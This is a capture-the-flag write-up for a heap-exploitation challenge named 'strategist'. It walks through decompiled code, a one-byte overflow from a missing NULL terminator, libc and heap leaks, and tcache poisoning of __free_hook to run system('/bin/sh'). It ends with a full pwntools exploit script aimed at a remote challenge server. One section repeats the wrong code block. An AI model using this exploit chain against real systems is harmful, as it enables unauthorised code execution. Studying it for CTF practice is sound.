
This exploit masterfully chains multiple subtle heap vulnerabilities, particularly leveraging the single-byte overflow from the lack of NULL termination in edit_plan(), to achieve full code execution.
# Enumeration

First of all, we start with a `checksec`:  

```console
gdb> !checksec stategist
Arch:       amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'./glibc/'
Stripped:   No
```



### Disassembly

Starting with `main()`:

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  _BYTE s[808]; // [rsp+0h] [rbp-330h] BYREF
  unsigned __int64 v5; // [rsp+328h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x320uLL);
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = menu();
        if ( v3 != 2 )
          break;
        show_plan(s);
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      create_plan(s);
    }
    if ( v3 == 3 )
    {
      edit_plan(s);
    }
    else
    {
      if ( v3 != 4 )
      {
LABEL_13:
        printf("%s\n[%sSir Alaric%s]: This plan will lead us to defeat!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
        exit(1312);
      }
      delete_plan(s);
    }
  }
}
```

As we can see, we have 4 options:
`Show` `Create` `Edit` `Delete`

Let's go into each function to analyze it.

#### create_plan()

```c
unsigned __int64 __fastcall create_plan(__int64 a1)
{
  int v2; // [rsp+18h] [rbp-18h] BYREF
  int v3; // [rsp+1Ch] [rbp-14h]
  void *v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = check(a1);
  if ( v3 == -1 )
  {
    printf("%s\n[%sSir Alaric%s]: Don't go above your head kiddo!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: How long will be your plan?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  v4 = malloc(v2);
  if ( !v4 )
  {
    printf("%s\n[%sSir Alaric%s]: This plan will be a grand failure!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Please elaborate on your plan.\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  read(0, v4, v2);
  *(_QWORD *)(a1 + 8LL * v3) = v4;
  printf(
    "%s\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\n\n",
    "\x1B[1;32m",
    "\x1B[1;33m",
    "\x1B[1;32m");
  return __readfsqword(0x28u) ^ v5;
}
```


#### show_plan()

```c
unsigned __int64 __fastcall show_plan(__int64 a1)
{
  signed int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to view?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  if ( (unsigned int)v2 >= 0x64 || !*(_QWORD *)(8LL * v2 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf(
    "%s\n[%sSir Alaric%s]: Plan [%d]: %s\n",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m",
    v2,
    *(const char **)(8LL * v2 + a1));
  return __readfsqword(0x28u) ^ v3;
}
```


#### edit_plan()

```c
unsigned __int64 __fastcall edit_plan(__int64 a1)
{
  size_t v1; // rax
  signed int v3; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to change?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v3 = 0;
  __isoc99_scanf("%d", &v3);
  if ( (unsigned int)v3 >= 0x64 || !*(_QWORD *)(8LL * v3 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Please elaborate on your new plan.\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v1 = strlen(*(const char **)(8LL * v3 + a1));
  read(0, *(void **)(8LL * v3 + a1), v1);
  putchar(10);
  return __readfsqword(0x28u) ^ v4;
}
```

The most critical vulnerability is in this function:
```c
 v1 = strlen(*(const char **)(8LL * v3 + a1));
  read(0, *(void **)(8LL * v3 + a1), v1);
```

When read() operates exactly on the strlen() result:

* No NULL terminator is added
* The last byte of our input will overwrite where a NULL byte would normally be
* If this byte borders another chunk's metadata, we can modify the size field

#### delete_plan()

```c
unsigned __int64 __fastcall delete_plan(__int64 a1)
{
  signed int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to delete?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  v2 = 0;
  __isoc99_scanf("%d", &v2);
  if ( (unsigned int)v2 >= 0x64 || !*(_QWORD *)(8LL * v2 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  free(*(void **)(8LL * v2 + a1));
  *(_QWORD *)(8LL * v2 + a1) = 0LL;
  printf("%s\n[%sSir Alaric%s]: We will remove this plan!\n\n", "\x1B[1;32m", "\x1B[1;33m", "\x1B[1;32m");
  return __readfsqword(0x28u) ^ v3;
}
```


### Libc leak stategy using unsorted bin

#### Step 1: Create Specific Chunk Layout
``
[ Chunk A (large) ][ Chunk B (guard) ]
``

Allocate a large chunk (Chunk A) that will go to the unsorted bin when freed
* Must be larger than the fastbin/tcache size limit (> 0x408 bytes)
* Needs to be populated with data that fills the entire buffer

Allocate a small guard chunk (Chunk B)
* Acts as a boundary to prevent consolidation with top chunk
* Size doesn't matter as much, just needs to be allocated
#### Step 2: Free the Large Chunk to Place in Unsorted Bin
When a chunk larger than the fastbin/tcache limit is freed, it's placed in the unsorted bin. At this point:

* The fd and bk pointers in the freed chunk header are set to point to the main_arena. These pointers contain addresses within LIBC

#### Step 3: Allocate a Smaller Chunk to Partially Reuse the Freed Chunk

The key insight is that if we allocate a chunk smaller than our freed large chunk:

* malloc will split the unsorted bin chunk
* Return part of it to us
* Our new chunk will contain the fd or bk pointer that points to main_arena
#### Step 4: Read the LIBC Pointer
Using show_plan() on this newly allocated chunk reveals the LIBC main_arena pointer, which we can use to:

Calculate the LIBC base address (by subtracting the known offset to main_arena)
Determine the location of critical functions like system() or one_gadget RCE addresses


# Solution

### First, we are going to leak a `libc address`. 

```python
# Leak a libc address
createplan(b'',0x500)  # 0
createplan(b'aaaa',0x20)  # 1
deleteplan(0)
createplan(b'',0x500)  # 0 again
```

When a large chunk is freed into the unsorted bin, it gets linked to the main_arena doubly-linked list. The fd and bk pointers in the chunk header become pointers into libc's main_arena, which persist even after reallocation.

### Extract and calculate Libc Base:

```python
leak = showplan(0)[1].strip()
leak = leak.ljust(8,b'\x00')    
leak = u64(leak)
leak = leak << 8
log.info(f'leak: {hex(leak)}')
libc.address = leak - 0x3ebc00
```

Use showplan(0) to display the contents of the reallocated chunk, which includes a libc pointer
Process and convert the leak to a usable address (padding to 8 bytes and left-shifting by 8 bits).
Calculate the libc base address by subtracting the known offset (0x3ebc00) of the leaked address

### Heap Layout Preparation and Heap Leak
```python
createplan(b'x'*(31),0x20)  # 2
createplan(b'b'*(0x20-1),0x20)  # 3
editplan(2,b'a'*(31))
deleteplan(1)
deleteplan(3)
createplan(b'',0x20)  #1
```
```
Create chunk #2 filled with 'x' characters (31 bytes)
Create chunk #3 filled with 'b' characters (0x20-1 bytes)
Edit chunk #2, replacing content with 'a' characters - important: this likely triggers the one-byte overflow since it writes exactly 31 bytes without NULL termination
Free chunks #1 and #3, placing them in the tcache
Allocate a new chunk that reuses the tcache entry for #1
```
###  Extracting Heap Base Address
Now the exploit has both libc base and heap base addresses, providing full knowledge of the memory layout.
```py
leakheap= showplan(1)[1].strip()
leakheap = leakheap.ljust(8,b'\x00')
leakheap = u64(leakheap)
leakheap = leakheap << 8
heap_base = leakheap - 0xb00
```

Show contents of chunk #1 which contains a heap address due to tcache manipulation.
Process the leak similar to the libc leak (padding, conversion, bit shifting).
Calculate the heap base address by subtracting 0xb00 from the leaked value
### Setting Up Overlapping Chunks
```py
deleteplan(2)   
createplan(b'a'*(0x500 - 9),0x500 - 8)  # 2
createplan(b'b'*(0x500 - 9),0x500-8)  # 3
createplan(b'c'*(0x68 - 9),0x68-8)  # 4
```
```
Free chunk #2
Allocate several new chunks with specific sizes to create a favorable heap layout:
Chunk #2: ~0x500 bytes
Chunk #3: ~0x500 bytes
Chunk #4: ~0x68 bytes (tcache-sized chunk)
```
### Overwriting Chunk Metadata
The precise offset writing and metadata modification create overlapping chunks, which is critical for the next step.
```py
editplan(3,b'x'*(0x500-9))
deleteplan(1)
deleteplan(3)
editplan(2,b'a'*(1273-9)+p8(0x0)*8+p8(0x01))
deleteplan(4)
```
```
Edit chunk #3 to fill it completely (no NULL terminator)
Free chunks #1 and #3
Use chunk #2 to perform a targeted one-byte overflow:
Write 'a' characters up to a specific offset (1273-9)
Write 8 NULL bytes
Write a single 0x01 byte - this is manipulating a crucial metadata field
Free chunk #4 to complete the heap manipulation
```
### Creating a Fake Chunk Over __free_hook
```py
editplan(3,b'x'*(0x500-9))
deleteplan(1)
deleteplan(3)
editplan(2,b'a'*(1273-9)+p8(0x0)*8+p8(0x01))
deleteplan(4)
```

```
Allocate a large chunk (0xa00-8 bytes) that will overlap with tcache entries due to the previous heap manipulation
The content is carefully crafted:
- Fill most of the chunk with 'z' characters
- Place a NULL qword (8 bytes of 0)
- Write 0x81 as a fake chunk size
- Write the address of __free_hook as a forward pointer
- Write a heap address as part of the fake chunk structure
```
### Final Exploit Chain
Final exploit trigger: When free() is called on the chunk containing `"/bin/sh\x00"`, the function pointer at `__free_hook` (now pointing to `system()`) will be called with that string as an argument, executing `system("/bin/sh")` and spawning a shell.
```py
createplan(b"/bin/sh\x00",0x68)
createplan(p64(system)+p64(0x0),0x70-8)
createplan(b'aaaa',0x10)
```
Allocate a chunk containing "/bin/sh\x00" (the command to be executed)
Allocate a chunk that, due to tcache poisoning, will be placed at __free_hook:
Overwrite __free_hook with the address of system()
Allocate one more small chunk (likely just a setup for the next step)


# Full code exploit

```py
from pwn import *


elf =context.binary = ELF('./strategist')
libc = ELF('./libc.so.6') 
#context.log_level = 'debug'
def start():
    return remote('94.237.51.14',38785)

p = start()

def createplan(content,size):
    p.sendlineafter(b'>',b'1')
    p.sendlineafter(b'>',str(size).encode())
    p.sendlineafter(b'>',content)


def showplan(idx):
    p.sendlineafter(b'>',b'2')
    p.sendlineafter(b'>',str(idx).encode())
    p.recvuntil(b':')
    return p.recvlines(2)

def editplan(idx,content):
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>',str(idx).encode())
    p.sendlineafter(b'>',content)

def deleteplan(idx):
    p.sendlineafter(b'>',b'4')
    p.sendlineafter(b'>',str(idx).encode())


# Initial heap leak setup
createplan(b'',0x500)  # 0
createplan(b'aaaa',0x20)  # 1
deleteplan(0)
createplan(b'',0x500)  # 0 again

leak = showplan(0)[1].strip()
leak = leak.ljust(8,b'\x00')    
leak = u64(leak)
leak = leak << 8
log.info(f'leak: {hex(leak)}')
libc.address = leak - 0x3ebc00

log.info(f'libc.address: {hex(libc.address)}')
malloc_hook = libc.sym['__malloc_hook']
log.info(f'malloc_hook: {hex(malloc_hook)}')
free_hook = libc.sym['__free_hook']
log.info(f'free_hook: {hex(free_hook)}')
list =[0x4f3ce,0x4f3d5,0x4f432,0x10a41c,0x10a428,0xe5622,0xe561e,0xe5617,0xe546f,0x4f3c7]
one_gadget = libc.address + list[7] 
log.info(f'one_gadget: {hex(one_gadget)}')
rop = ROP(libc)
ret= rop.find_gadget(['ret'])[0]
log.info(f'ret: {hex(ret)}')
system = libc.sym['system']
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
log.info(f'system: {hex(system)}')



createplan(b'x'*(31),0x20)  # 2
createplan(b'b'*(0x20-1),0x20)  # 3


editplan(2,b'a'*(31))
deleteplan(1)
deleteplan(3)
createplan(b'',0x20)  #1

leakheap= showplan(1)[1].strip()
leakheap = leakheap.ljust(8,b'\x00')
leakheap = u64(leakheap)
leakheap = leakheap << 8
heap_base = leakheap - 0xb00
log.info(f'leakheap: {hex(heap_base)}')

deleteplan(2)   



# Overwrite __malloc_hook with one_gadget
createplan(b'a'*(0x500 - 9),0x500 - 8)  # 2
createplan(b'b'*(0x500 - 9),0x500-8)  # 3
createplan(b'c'*(0x68 - 9),0x68-8)  # 4
editplan(3,b'x'*(0x500-9))
deleteplan(1)
deleteplan(3)
editplan(2,b'a'*(1273-9)+p8(0x0)*8+p8(0x01))
deleteplan(4)
createplan(b'z'*(0x500-0x10 )+p64(0x0)+p64(0x81)+p64(free_hook)+p64(heap_base+0x10),0xa00-8)
#editplan(1,b'd'*(0x4f8-24))
createplan(b"/bin/sh\x00",0x68)
createplan(p64(system)+p64(0x0),0x70-8)
createplan(b'aaaa',0x10)
#gdb.attach(p)

#gdb.attach(p,'''
#b *malloc
#b *free
#''') 
#createplan(b'aaaa',0x20)



p.interactive()

```

![image](https://github.com/user-attachments/assets/894952d4-0392-4913-8254-304fc70ecc51)
